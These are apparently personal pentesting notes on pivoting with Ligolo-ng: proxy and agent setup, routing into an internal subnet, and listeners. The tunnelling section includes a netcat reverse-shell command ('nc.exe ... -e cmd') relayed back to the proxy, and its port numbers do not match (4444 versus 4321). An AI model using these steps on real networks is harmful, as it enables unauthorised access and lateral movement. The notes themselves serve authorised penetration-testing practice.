Navigation: [[Pentesting]]

---
# Ligolo
By far the best tool for this is [Ligolo-ng](https://github.com/nicocha30/ligolo-ng). I'll be using [this video](https://www.youtube.com/watch?v=DM1B8S80EvQ) as a reference for this section. 

Here's a screenshot of the example we'll be using:
![[Ligolo_Setup.png]]
### Our Machine (Proxy)
Make sure to download the proxy from the [releases](https://github.com/nicocha30/ligolo-ng/releases) page.

From here we can run the following:
```shell
sudo ip tuntap add user [your_username] mode tun ligolo
sudo ip link set ligolo up

# On Ligolo-ng >= v0.6, you can just run the following:
interface_create --name "<name>"

# Now we can run the proxy from the directory
./proxy --selfcert
# this should give us a port number it's listening on now, we'll need it for the agent


# Assuming the agent has connected now
help # check options
session # list active sessions, enter session number to remote connect to host
```

### Jump Server (Agent)
Download the agent from releases.

Make sure to setup the proxy server first. Then here's how we can connect to it:
```shell
# Ignore the cert since we created a self certificate
ligolo-agent.exe -connect <Proxy IP>:<port> -ignore-cert
```

### Setting Up the Pivot
```shell
# From our proxy, open a new terminal and run the following
sudo ip route add <internal ip>/24 dev ligolo
# For the above example, the internal would've been 10.10.120.0/24

# Go back to the proxy and enter the session, then run the following command
start
```
### Setting Up a Tunnel
Here's how we can get a reverse shell from a second host into our proxy server.
```shell
# Ensure that we're on the pivot session
# The following will create a listening socket on the agent and redirect them to port 4321 on the proxy
listener_add --addr 0.0.0.0:1234 --to 127.0.0.1:4444

# If we wanted to create a listener for HTTP download/upload
# When running HTTP requests, use the IP and port of the pivot
listener_add --addr 0.0.0.0:1235 --to 127.0.0.1:80

# On the proxy, we can run the following
nc -lvp 4321

# On the second host (MS02 in the example)
nc.exe <jump IP> <jump port> -e cmd
# jump IP would be 10.10.120.131 and the port would be 1234 in the example

# In the pivot session, we can use the following 2 commands
listener_list 
listener_stop <num>
```



---
Navigation: [[Pentesting]]